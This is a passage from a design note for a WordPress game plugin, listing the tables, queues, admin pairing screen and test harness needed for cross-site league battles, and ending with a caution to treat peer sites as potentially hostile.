- Battles are already persisted with both reports, which is the natural place to record a remote
  battle's UUID.

## What would need adding

- A `ido_leagues` table: league id and name, hub URL, ruleset version, ruleset, fingerprint, round
  calendar, the member cap, and whether this site is the originator.
- A `ido_sites` table: peer site URL, shared secret, sequence counters, trust status.
- The league ruleset applied locally, with those settings locked in the admin and a fingerprint
  recomputed whenever they change.
- `ido_packets_in` and `ido_packets_out`: the inbound staging table and the outbound retry
  queue, each keyed by (peer, UUID), carrying the delay as process_after and send_after.
- `ido_league_marches` and `ido_league_contributions`: what each empire committed, what came
  home, and its share of the spoils.
- A queue and a cron worker, since remote battles cannot resolve inside the request that starts
  them. This is where the queued combat path from the original design question comes back.
- An admin screen for pairing with another site, which must require an explicit confirmation from
  *both* administrators before any packet is accepted.
- A player-facing league page, `[ido_league]`, created only while league play is on.
- A two-site test harness, since the escrow, the delay and the settlement can only be exercised
  together by running a real exchange between two installs.

## A caution

The moment this plugin accepts data from another site, the attack surface changes completely:
every assumption Phase 1 makes about input coming from a signed-in WordPress user with a nonce
stops holding. The packet handler should be written as if the sending site is hostile, because
one day one of them will be compromised.
